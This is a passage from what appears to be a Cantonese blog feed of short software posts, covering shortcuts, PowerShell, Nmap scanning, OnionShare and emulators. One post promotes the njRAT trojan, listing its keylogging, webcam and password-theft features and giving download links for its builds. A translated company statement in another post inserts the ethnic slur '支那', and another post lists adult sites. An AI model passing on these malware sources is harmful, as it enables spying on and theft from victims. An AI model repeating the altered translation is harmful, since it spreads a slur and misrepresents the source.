    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>下面列出左 Mozilla Firefox 既所有快捷鍵。</p>
<ul>
<li>重新整理 → F5 || Ctrl + R</li>
<li>Inspect (切換開發者工具) → F12</li>
<li>Copy → Ctrl + c</li>
<li>Paste → Ctrl + v</li>
<li>Exit → ESC</li>
<li>關閉分頁 → Ctrl + w</li>
</ul>
<p>參考資料:<br><a href="https://www.computerhope.com/shortcut/firefox.htm">https://www.computerhope.com/shortcut/firefox.htm</a><br><a href="https://support.mozilla.org/zh-TW/kb/keyboard-shortcuts-perform-firefox-tasks-quickly">https://support.mozilla.org/zh-TW/kb/keyboard-shortcuts-perform-firefox-tasks-quickly</a></p>
]]></content>
      <categories>
        <category>Firefox</category>
      </categories>
      <tags>
        <tag>Shortkeys</tag>
        <tag>Gui</tag>
        <tag>Browser</tag>
      </tags>
  </entry>
  <entry>
    <title>NirSoft | WinLister</title>
    <url>/2022/01/15/NirSoft-WinLister/</url>
    <content><![CDATA[<h1 id="WinLister"><a href="#WinLister" class="headerlink" title="WinLister"></a>WinLister</h1><p>此程序顯示系統上打開的窗口列表。<br>對於每個窗口，都會顯示一些有用的信息：標題、窗口句柄、位置、大小、類名、進程號、創建窗口的程序的名稱等等……<br>此外，您可以輕鬆隱藏、顯示、關閉或設置為最頂層模式選定的窗口，或將窗口列表保存為文本或 HTML 文件。</p>
<p>…</p>
<p>對於要寫Program 搵 Program 既 Class 名係咩既人黎講，呢個Program係恩物。</p>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/01/15/NirSoft-WinLister/winlister.png" class="">

<h2 id="官方網站"><a href="#官方網站" class="headerlink" title="官方網站"></a>官方網站</h2><ul>
<li><a href="https://www.nirsoft.net/utils/winlister.html">Winlister</a></li>
</ul>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><ul>
<li><a href="https://www.nirsoft.net/utils/winlister.zip">x32 bit</a></li>
<li><a href="https://www.nirsoft.net/utils/winlister-x64.zip">x64 bit</a></li>
</ul>
<h3 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h3><p><a href="https://www.nirsoft.net/">Nirsoft</a> 仲有好多唔同既工具，包括以下既範疇既工具，大家可以自己探索下。</p>
<ul>
<li>Password Recovery Utilities</li>
<li>Network Monitoring Tools</li>
<li>Internet Related Utilities</li>
<li>MS-Outlook Tools</li>
<li>Command-Line Utilities</li>
<li>Desktop Utilities</li>
<li>Freeware System Tools</li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
        <tag>Nirsoft</tag>
      </tags>
  </entry>
  <entry>
    <title>Njrat - 針對 Windows 系統的特洛伊木馬</title>
    <url>/2022/02/02/Njrat-trojan-tools/</url>
    <content><![CDATA[<h1 id="njRAT"><a href="#njRAT" class="headerlink" title="njRAT"></a>njRAT</h1><p>njRAT，也稱為Bladabindi，是一種遠程訪問工具或特洛伊木馬，允許程序所有者控制最終用戶的計算機。</p>
<h2 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h2><ul>
<li>桌面控制</li>
<li>控制相機/凸輪</li>
<li>流程管理器/任務管理器</li>
<li>鍵盤記錄器：查看目標在電腦上輸入的任何內容</li>
<li>創建消息：與受害者聊天跳躍</li>
<li>檢查密碼：在瀏覽器應用程序中查看所有已保存的密碼</li>
<li>服務器：更新：通過鏈接更新，通過磁盤重新啟動更新刪除服務器解析網絡更改刪除中的名稱</li>
</ul>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><hr>
<h2 id="原版"><a href="#原版" class="headerlink" title="原版"></a>原版</h2><img src="/2022/02/02/Njrat-trojan-tools/about.png" class="">
<img src="/2022/02/02/Njrat-trojan-tools/by.png" class="">
<img src="/2022/02/02/Njrat-trojan-tools/hacked.png" class="">

<h2 id="改版"><a href="#改版" class="headerlink" title="改版"></a>改版</h2><img src="/2022/02/02/Njrat-trojan-tools/sc1.png" class="">

<h1 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h1><hr>
<h2 id="改版-1"><a href="#改版-1" class="headerlink" title="改版"></a>改版</h2><ul>
<li><a href="https://github.com/TheC0mpany/NjRat-0.7D-Green-Edition-by-im523">https://github.com/TheC0mpany/NjRat-0.7D-Green-Edition-by-im523</a></li>
<li><a href="https://github.com/OneParsec/njRAT">https://github.com/OneParsec/njRAT</a></li>
</ul>
<h2 id="原版-1"><a href="#原版-1" class="headerlink" title="原版"></a>原版</h2><ul>
<li><a href="https://www.connect-trojan.com/details.php?id=4941">https://www.connect-trojan.com/details.php?id=4941</a></li>
<li><a href="https://tools.infected-zone.com/index.php">https://tools.infected-zone.com/index.php</a></li>
<li><a href="https://github.com/TheC0mpany/njRAT-v0.6.4-by-njq8">https://github.com/TheC0mpany/njRAT-v0.6.4-by-njq8</a></li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap - 探測計算機網絡工具</title>
    <url>/2021/12/14/Nmap-commands/</url>
    <content><![CDATA[<img src="cover.svg" width="200px"/>

<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>Nmap（網絡映射器）是由 Gordon Lyon（他的筆名 Fyodor Vaskovich）創建的免費開源網絡掃描儀。<br>Nmap用於通過發送數據包和分析響應來發現計算機網絡上的主機和服務。<br>Nmap 提供了許多用於探測計算機網絡的功能，包括主機發現和服務以及操作系統檢測。<br>這些功能可通過提供更高級服務檢測、漏洞檢測、和其他功能的腳本進行擴展。<br>Nmap 可以適應網絡條件，包括掃描期間的延遲和擁塞。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
<li>主機發現 - 識別網絡上的主機。例如，列出響應 TCP 和/或 ICMP 請求或打開特定端口的主機。</li>
<li>端口掃描 - 枚舉目標主機上的開放端口。</li>
<li>版本檢測——查詢遠程設備上的網絡服務以確定應用程序名稱和版本號。</li>
<li>TCP/IP 堆棧指紋識別 – 根據對網絡設備網絡活動的觀察來確定網絡設備的操作系統和硬件特性。</li>
<li>與目標的腳本化交互——使用 Nmap 腳本引擎 (NSE) 和 Lua 編程語言。</li>
<li>Nmap 可以提供有關目標的更多信息，包括反向 DNS 名稱、設備類型和 MAC 地址。</li>
</ul>
<h1 id="安裝-Net-tools"><a href="#安裝-Net-tools" class="headerlink" title="安裝 Net-tools"></a>安裝 Net-tools</h1><p>如果要 Scan Gateway，我地首先要搵到而加用緊既 Network Gateway IP 係乜先，<br>我地需要安裝一個套件叫做 <code>net-tools</code>，然後用佢既工具去搵 Gateway IP。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install net-tools -y</span><br></pre></td></tr></table></figure>

<img src="/2021/12/14/Nmap-commands/nt.png" class="">

<h2 id="尋找-Gateway-Addres"><a href="#尋找-Gateway-Addres" class="headerlink" title="尋找 Gateway Addres"></a>尋找 Gateway Addres</h2><p>當你裝好之後，我地輸入以下指令搵 Gataway IP。</p>
<ul>
<li>下圖中，<span style="color:purple;">紫色圈</span>就係你既 Gataway IP。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip r</span><br></pre></td></tr></table></figure>

<img src="/2021/12/14/Nmap-commands/find%20r.png" class="">

<h1 id="安裝-NMAP"><a href="#安裝-NMAP" class="headerlink" title="安裝 NMAP"></a>安裝 NMAP</h1><p>安裝於 Debian, Ubuntu 系統上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nmap -y</span><br></pre></td></tr></table></figure>

<img src="/2021/12/14/Nmap-commands/install.png" class="">

<h1 id="NMAP-Scan-Network"><a href="#NMAP-Scan-Network" class="headerlink" title="NMAP Scan Network"></a>NMAP Scan Network</h1><p>當你搵到之後，只需要將 Gateway IP 抄底再輸入以下指令。</p>
<ul>
<li><code>/24</code>，意思是掃瞄整個 Network，如果不輸入 <code>/24</code> 就只有 Scan 指定一個裝置。</li>
</ul>
<div class="note info flat">
    說明 : 每個參數都有唔同既意思，例如係資料出現既格式，出現啲乜既資料。
</div>


<h2 id="Pn-sV"><a href="#Pn-sV" class="headerlink" title="-Pn -sV"></a>-Pn -sV</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [gateway ipv4]/24 -Pn -sV</span><br></pre></td></tr></table></figure>

<h2 id="Pn"><a href="#Pn" class="headerlink" title="-Pn"></a>-Pn</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [gateway ipv4]/24 -Pn</span><br></pre></td></tr></table></figure>

<h2 id="sS-O"><a href="#sS-O" class="headerlink" title="-sS -O"></a>-sS -O</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sS -O [gateway ipv4]/24</span><br></pre></td></tr></table></figure>

<h2 id="sP"><a href="#sP" class="headerlink" title="-sP"></a>-sP</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP [gateway ipv4]/24</span><br></pre></td></tr></table></figure>

<h2 id="sL"><a href="#sL" class="headerlink" title="-sL"></a>-sL</h2><p>nslookup 的反向操作，利用 DNS 反查 IP 的方式，來篩選標的是否上線。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sL [gateway ipv4]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>OnionShare - 完全匿名狀態上網</title>
    <url>/2022/05/23/OnionShare-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="OnionShare" src="cover.png" width="200px"/>
    <h1 align="center">Online Share</h1>
</p>

<p>OnionShare 是一個開源工具，可讓您安全匿名地共享文件、託管網站以及使用 Tor 網絡與朋友聊天。</p>
<p><span style="background-color: red;color:black;">要使用，必需使用 TorNetwork (TorBrowser)</span></p>
<p><a href="https://onionshare.org/">https://onionshare.org/</a></p>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><p>所有的功能也是匿名進行。</p>
<ul>
<li>匿名聊天</li>
<li>匿名分享檔案</li>
<li>匿名接收檔案</li>
<li>託管匿名靜態網站 (onion)</li>
</ul>
<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><ul>
<li>Linux</li>
<li>Mac</li>
<li>Windows</li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/05/23/OnionShare-Apps/program%201.png" class="">

<h2 id="示範使用分享檔案"><a href="#示範使用分享檔案" class="headerlink" title="示範使用分享檔案"></a>示範使用分享檔案</h2><img src="/2022/05/23/OnionShare-Apps/how.gif" class="">
]]></content>
      <categories>
        <category>匿名</category>
      </categories>
      <tags>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF-XChange Viewer - PDF 檢視器</title>
    <url>/2022/05/29/PDF-XChange-Editor-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="PDF-XChange Editor" src="cover.png" width="auto"/>
    <h1 align="center">PDF-XChange Viewer</h1>
    <center>PDF-XChange Viewer 是一個運行在 Windows 系統中 PDF 檔案檢視軟件。</center>
</p>

<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>免費</li>
<li>速度更快 (即使一千多頁也順暢的載入。)</li>
<li>乾淨且完全優化的安裝文件。</li>
<li>沒有來自第三方的煩人的附加組件/可選插件。</li>
<li>乾淨且完全優化的安裝文件。</li>
<li>沒有額外的優惠、廣告或下載。</li>
</ul>
<h1 id="PDF-XCHANGE"><a href="#PDF-XCHANGE" class="headerlink" title="PDF-XCHANGE"></a>PDF-XCHANGE</h1><blockquote>
<p>23 Apr 2020</p>
</blockquote>
<p>As of Tomorrow, April 24th, 2020 - Tracker Software Products (Canada) Ltd &amp; PDF-XChange Co Ltd -  will cease all sales and support of our range of PDF-XChange Editing and Manipulation software to Mainland China and Hong Kong or sold to Chinese Companies or users in these locations.</p>
<p>Our products (both free and paid for) are used by several 100’s millions of users around the world - either in our own end user software applications or via being embedded in publisher’s Software Products and used indirectly.</p>
<p>All new sales to users on/in Mainland China, Hong Kong and Macau will therefore cease and no longer be available.</p>
<p>We will not change this policy unless the manner in which China and its governing regime interacts with the rest of world in every regard is done in a more open and globally responsible manner.</p>
<blockquote>
<p>從明天起，2020 年 4 月 24 日 - Tracker Software Products (Canada) Ltd &amp; PDF-XChange Co Ltd - 將停止向中國大陸和香港銷售和支持我們的 PDF-XChange 編輯和操作軟件系列或出售給 這些地點的中國公司或用戶。<br>我們的產品（免費和付費）被全球數以億計的用戶使用——無論是在我們自己的最終用戶軟件應用程序中，還是通過嵌入出版商的軟件產品中並間接使用。<br>因此，支那中国、香港和澳門用戶的新銷售將停止且不再可用。<br>我們不會改變這一政策，除非支那中国及其治理體制在各方面與世界其他地區互動的方式以更加開放和全球負責的方式進行。</p>
</blockquote>
<p><a href="https://www.tracker-software.com/company/news-press-events/view/230">https://www.tracker-software.com/company/news-press-events/view/230</a></p>
<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><ul>
<li>Windows</li>
</ul>
<h1 id="官方網站"><a href="#官方網站" class="headerlink" title="官方網站"></a>官方網站</h1><ul>
<li><a href="https://www.tracker-software.com/product/downloads">https://www.tracker-software.com/product/downloads</a></li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/05/29/PDF-XChange-Editor-Apps/pg1.png" class="">
<img src="/2022/05/29/PDF-XChange-Editor-Apps/pg2.png" class="">
<img src="/2022/05/29/PDF-XChange-Editor-Apps/how.gif" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>PCSX2 - PlayStation 2 模擬器</title>
    <url>/2022/05/20/PS2-Virtual-Machine-emalator-pcsx2/</url>
    <content><![CDATA[<img src="/2022/05/20/PS2-Virtual-Machine-emalator-pcsx2/cover.webp" class="">

<h1 id="PCSX2"><a href="#PCSX2" class="headerlink" title="PCSX2"></a>PCSX2</h1><p>PCSX2 係一個可以令你喺電腦上玩 PS2 Games 既模擬器，<br>支援既系統有 :</p>
<ul>
<li>Linux</li>
<li>Windows</li>
</ul>
<p>官網 : <a href="https://pcsx2.net/">https://pcsx2.net/</a><br>Bios : <a href="https://consolegames.down10.software/bios/pcsx2-playstation-2-bios-3">https://consolegames.down10.software/bios/pcsx2-playstation-2-bios-3</a></p>
<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
<li>開源 (Open Source)</li>
<li>可保存狀態 (Save point 返去上一個狀態)</li>
<li>唔需要勁既電腦，超低效能都玩得順暢</li>
</ul>
<h2 id="需要"><a href="#需要" class="headerlink" title="需要"></a>需要</h2><ul>
<li>bios 檔 (需要自行上網搵)</li>
<li>iso 遊戲光碟檔 (需要自行上網搵)</li>
<li>手制 (可選，你唔用手制都可以用電腦keyboard玩)</li>
</ul>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/05/20/PS2-Virtual-Machine-emalator-pcsx2/program.png" class="">]]></content>
      <tags>
        <tag>Games</tag>
      </tags>
  </entry>
  <entry>
    <title>成人網站大全 (不包括殘體網)</title>
    <url>/2022/01/22/Porn-web-list/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>睇咸網打個飛機又唔知去咩網好？<br>唔緊要，呢度我擺條 List 俾你慢慢 J 飽佢！</p>
<h1 id="真人網站-主要"><a href="#真人網站-主要" class="headerlink" title="真人網站 (主要)"></a>真人網站 (主要)</h1><hr>
<h2 id="Pornhub-com"><a href="#Pornhub-com" class="headerlink" title="Pornhub.com"></a>Pornhub.com</h2><img src="/2022/01/22/Porn-web-list/pornhub.png" class="">
<p><a href="https://www.pornhub.com/">https://www.pornhub.com/</a></p>
<h2 id="porn87-com"><a href="#porn87-com" class="headerlink" title="porn87.com"></a>porn87.com</h2><img src="/2022/01/22/Porn-web-list/porn87.png" class="">
<p><a href="https://porn87.com/">https://porn87.com/</a></p>
<h2 id="thisav-com"><a href="#thisav-com" class="headerlink" title="thisav.com"></a>thisav.com</h2><img src="/2022/01/22/Porn-web-list/thisav.png" class="">
<p><a href="https://www.thisav.com/">https://www.thisav.com/</a></p>
<h1 id="動畫網站-主要"><a href="#動畫網站-主要" class="headerlink" title="動畫網站 (主要)"></a>動畫網站 (主要)</h1><hr>
<h2 id="avbebe-com"><a href="#avbebe-com" class="headerlink" title="avbebe.com"></a>avbebe.com</h2><img src="/2022/01/22/Porn-web-list/avbebe.png" class="">
<p><a href="https://avbebe.com/">https://avbebe.com/</a></p>
<h2 id="hanime-tv"><a href="#hanime-tv" class="headerlink" title="hanime.tv"></a>hanime.tv</h2>
<p><a href="https://hanime.tv/">https://hanime.tv/</a></p>
<img src="/2022/01/22/Porn-web-list/hanimetv.png" class="">


<h2 id="hanime1-me"><a href="#hanime1-me" class="headerlink" title="hanime1.me"></a>hanime1.me</h2><img src="/2022/01/22/Porn-web-list/hanime1.me.png" class="">
<p><a href="https://hanime1.me/">https://hanime1.me/</a></p>
]]></content>
      <categories>
        <category>甜網</category>
      </categories>
      <tags>
        <tag>成人</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell - 常用基本指令</title>
    <url>/2022/02/17/Power-Shell-Commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Windows 內建除左 <code>cmd</code>，<br>其實係仲有個叫 <code>PowerShell</code></p>
<img src="iconn.png"/>

<p>今篇文只會講 Powershell 既 commands，<br>並唔會講 Powershell 都用到既 Linux commands.</p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a><span style="color:darkred">指令</span></h2><h3 id="刪除檔案"><a href="#刪除檔案" class="headerlink" title=" 刪除檔案"></a><i class="fas fa-terminal"></i> 刪除檔案</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Remove-item file_or_folder -Force</span><br></pre></td></tr></table></figure>

<h3 id="新增檔案"><a href="#新增檔案" class="headerlink" title=" 新增檔案"></a><i class="fas fa-terminal"></i> 新增檔案</h3><p>喺而加呢個位加個檔案</p>
<div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fas fa-terminal"></i> 新增檔案 方法1</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fas fa-terminal"></i> 新增檔案 方法2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><blockquote>
<p>簡單冇咁 Detail 方法</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">New-Item &quot;woo.txt&quot; -Value &quot;txt 入面既內容&quot;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><blockquote>
<p>更加詳細既方法</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">New-Item -Path . -Name &quot;woo.txt&quot; -ItemType &quot;file&quot; -Value &quot;txt 入面既內容&quot;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>

<h3 id="新增資料夾"><a href="#新增資料夾" class="headerlink" title=" 新增資料夾"></a><i class="fas fa-terminal"></i> 新增資料夾</h3><p>add 個 folder 喺 <code>c drive</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">New-Item -Path &quot;c:\&quot; -Name &quot;Folder_new&quot; -ItemType &quot;directory&quot;</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item?view=powershell-7.2">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-item?view=powershell-7.2</a><br><a href="https://shellgeek.com/powershell-mkdir-to-create-directory/">https://shellgeek.com/powershell-mkdir-to-create-directory/</a></p>
]]></content>
      <categories>
        <category>Power Shell</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerShell - 因為這個系統上已停用指令碼執行</title>
    <url>/2022/02/10/Power-Shell-%E5%9B%A0%E7%82%BA%E9%80%99%E5%80%8B%E7%B3%BB%E7%B5%B1%E4%B8%8A%E5%B7%B2%E5%81%9C%E7%94%A8%E6%8C%87%E4%BB%A4%E7%A2%BC%E5%9F%B7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>當你喺 PowerShell 開啟一個程式，<br>然後佢又話 <code>因為這個系統上已停用指令碼執行。</code></p>
<p>首先用 系統管理員 開 PowerShell，<br>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get-executionpolicy</span><br></pre></td></tr></table></figure>

<p>佢應該會顯示 <code>Restricted</code></p>
<p>然後再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure>

<p>然後佢會問你改唔改，你撳 <code>A</code>。</p>
<p>咁你再試下開個程式就成功啦。</p>
<p>參考資料:<br><a href="https://limitedcode.blogspot.com/2016/03/powershell-ps1.html">https://limitedcode.blogspot.com/2016/03/powershell-ps1.html</a></p>
]]></content>
      <categories>
        <category>Power Shell</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>問題</tag>
      </tags>
  </entry>
  <entry>
    <title>Premiere Pro - 使用 MisterHorse 轉場效果</title>
    <url>/2022/01/18/Premiere-Pro-Mister-Horse-transitions-how/</url>
    <content><![CDATA[<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>拖拉你要既轉場特效就得。</p>
<p>另外你可以選擇用唔用佢轉場個陣既聲，只需要 Tick 返要定唔要 Add Sound。</p>
<p>示範影片</p>
<img src="/2022/01/18/Premiere-Pro-Mister-Horse-transitions-how/1.gif" class="">]]></content>
      <categories>
        <category>Adobe</category>
      </categories>
      <tags>
        <tag>Mister horse</tag>
        <tag>Premiere Pro</tag>
      </tags>
  </entry>
  <entry>
    <title>Premiere Pro - 快捷鍵</title>
    <url>/2022/01/18/Premiere-Pro-Shortkeys/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>剪片既時候會用到好多 Hotkeys，以下會說明 Hotkeys。</p>
<h2 id="非剪片既時候"><a href="#非剪片既時候" class="headerlink" title="非剪片既時候"></a>非剪片既時候</h2><ul>
<li>Project → Ctrl + Alt + N</li>
<li>Sequence → Ctrl + N</li>
<li>Bin → Ctrl + /</li>
<li>Open Project → Ctrl + O</li>
<li>Close Project → Ctrl + Shift + W</li>
<li>Close Panel → Ctrl + W</li>
<li>Save → Ctrl + S</li>
<li>Save As… → Ctrl + Shift + S</li>
<li>Save a Copy → Ctrl + Alt + S</li>
<li>Capture → F5</li>
<li>Batch Capture… → F6</li>
<li>Import from Media Browser → Ctrl + Alt + I</li>
<li>Import… → Ctrl + I</li>
<li>Export Media → Ctrl + M</li>
<li>Get Properties for Selection… → Ctrl + Shift + H</li>
<li>Exit → Ctrl + Q </li>
</ul>
<h2 id="剪片既時候"><a href="#剪片既時候" class="headerlink" title="剪片既時候"></a>剪片既時候</h2><ul>
<li>Undo → Ctrl + Z</li>
<li>Redo → Ctrl + Shift + Z</li>
<li>Cut → Ctrl + X</li>
<li>Copy → Ctrl + C</li>
<li>Paste → Ctrl + V</li>
<li>Paste Insert → Ctrl + Shift + V</li>
<li>Paste Attributes → Ctrl + Alt + V</li>
<li>Clear → Delete</li>
<li>Ripple Delete → Shift + Delete</li>
<li>Duplicate → Ctrl + Shift + A</li>
<li>Select All → Ctrl + A</li>
<li>Deselect All → Ctrl + Shift + A</li>
<li>Find… → Ctrl + F</li>
<li>Edit Original → Ctrl + E</li>
<li>Keyboard Shortcuts → Ctrl + Alt + K</li>
<li>Copy item → Alt + 拉動 item</li>
<li>Select multi item → 撳實 Shift 再 撳 item</li>
</ul>
<h2 id="Clip"><a href="#Clip" class="headerlink" title="Clip"></a>Clip</h2><ul>
<li>Make Subclip… → Ctrl + U</li>
<li>Audio Channels… → Shift + G</li>
<li>Audio Gain → G</li>
<li>Speed/Duration… → Ctrl + R</li>
<li>Insert → ,</li>
<li>Overwrite → .</li>
<li>Enable → Shift + E</li>
<li>Link → Ctrl + L</li>
<li>Group → Ctrl + G</li>
<li>Ungroup → Ctrl + Shift + G </li>
</ul>
<h2 id="Sequence"><a href="#Sequence" class="headerlink" title="Sequence"></a>Sequence</h2><ul>
<li>Render Effects in Work Area → Enter</li>
<li>Match Frame → F</li>
<li>Reverse Match Frame → Shift + R</li>
<li>Add Edit → Ctrl + K</li>
<li>Add Edit to All Tracks → Ctrl + Shift + K</li>
<li>Trim Edit → Shift + T</li>
<li>Extend Selected Edit to Playhead → E</li>
<li>Apply Video Transition → Ctrl + D</li>
<li>Apply Audio Transition → Ctrl + Shift + D</li>
<li>Apply Default Transitions to Selection → Shift + D</li>
<li>Lift → ]</li>
<li>Extract → [</li>
<li>Zoom In → =</li>
<li>Zoom Out → -</li>
<li>Next in Sequence →Shift + ;</li>
<li>Previous in Sequence → Ctrl + Shift + ;</li>
<li>Snap in Timeline → S</li>
<li>Make Subsequence → Shift + U</li>
<li>Add new caption track → Opt + Cmd + A</li>
<li>Add caption at playhead → Opt + Cmd + C</li>
<li>Go to next caption segment → Opt + Cmd + Down</li>
<li>Go to previous caption segment → Opt + Cmd + Up</li>
</ul>
<h2 id="Markers"><a href="#Markers" class="headerlink" title="Markers"></a>Markers</h2><ul>
<li>Mark In → I</li>
<li>Mark Out → O</li>
<li>Mark Clip → X</li>
<li>Mark Selection → /</li>
<li>Go to In → Shift + I</li>
<li>Go to Out → Shift + O</li>
<li>Clear In → Ctrl + Shift + I</li>
<li>Clear Out → Ctrl + Shift + O</li>
<li>Clear In and Out → Ctrl + Shift + X</li>
<li>Add Marker → M</li>
<li>Go to Next Marker → Shift + M</li>
<li>Go to Previous Marker → Ctrl + Shift + M</li>
</ul>
<p>參考資料:<br><a href="https://www.domestika.org/en/blog/2894-80-essential-adobe-premiere-pro-shortcuts-for-editing-video-in-2021">https://www.domestika.org/en/blog/2894-80-essential-adobe-premiere-pro-shortcuts-for-editing-video-in-2021</a></p>
]]></content>
      <categories>
        <category>Adobe</category>
      </categories>
      <tags>
        <tag>Shortkeys</tag>
        <tag>Premiere Pro</tag>
      </tags>
  </entry>
  <entry>
    <title>Premiere Pro - 影片格式設定</title>
    <url>/2022/01/18/Premiere-Pro-video-quality-settings/</url>
    <content><![CDATA[<h1 id="點解？"><a href="#點解？" class="headerlink" title="點解？"></a>點解？</h1><p>有時你條片點 output 都係咁低畫質，有可能係因為你條片既格式係set死左。<br>咁我地去返設定再改返就得。</p>
<p>去返 Sequence &gt; Sequence Settings… &gt; Video &gt; 改返</p>
<p>Frame Size 改做 1920x1080 再 OK 再 OK 就得。</p>
<p>以下示範</p>
<img src="/2022/01/18/Premiere-Pro-video-quality-settings/How-1.gif" class="">]]></content>
      <categories>
        <category>Adobe</category>
      </categories>
      <tags>
        <tag>Premiere Pro</tag>
      </tags>
  </entry>
  <entry>
    <title>Putty Client - 指令化伺服器連接工具</title>
    <url>/2021/12/17/Putty-Client/</url>
    <content><![CDATA[<img src="putty.svg" width="200px"/>

<h1 id="Putty"><a href="#Putty" class="headerlink" title="Putty"></a>Putty</h1><p>Putty 係一款俾你 Connect Server 既 Program,<br>同埋佢係Open Source 既，係由一班志願者開發同埋支持</p>
<p>【官方網站】：<a href="https://www.putty.org/">https://www.putty.org/</a><br>【程式語言】：英文</p>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2021/12/17/Putty-Client/program.png" class="">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>RTFX animation | 超勁既卡通特效包</title>
    <url>/2022/01/22/RTFX-animation/</url>
    <content><![CDATA[<h1 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h1><ul>
<li><a href="https://rtfxanimation.com/">RTFX Animation</a></li>
<li><a href="https://videohive.net/item/rtfx-generator-440-fx-pack/19563523?irgwc=1&clickid=1vs3mayLfxyIRDy2quTXLQmtUkGywsy82zLZRk0&iradid=275988&irpid=1288505&iradtype=ONLINE_TRACKING_LINK&irmptype=mediapartner&mp_value1=">videohive</a></li>
</ul>
<h1 id="影片"><a href="#影片" class="headerlink" title="影片"></a>影片</h1><iframe width="845" height="475" src="https://www.youtube.com/embed/XqaU7V6hzyQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<h1 id="圖片"><a href="#圖片" class="headerlink" title="圖片"></a>圖片</h1><img src="/2022/01/22/RTFX-animation/1.png" class="">]]></content>
      <categories>
        <category>Adobe</category>
      </categories>
      <tags>
        <tag>Premiere Pro</tag>
        <tag>After Effect</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse engineering - 逆向工程工具</title>
    <url>/2022/01/09/Reverse-engineering-tools/</url>
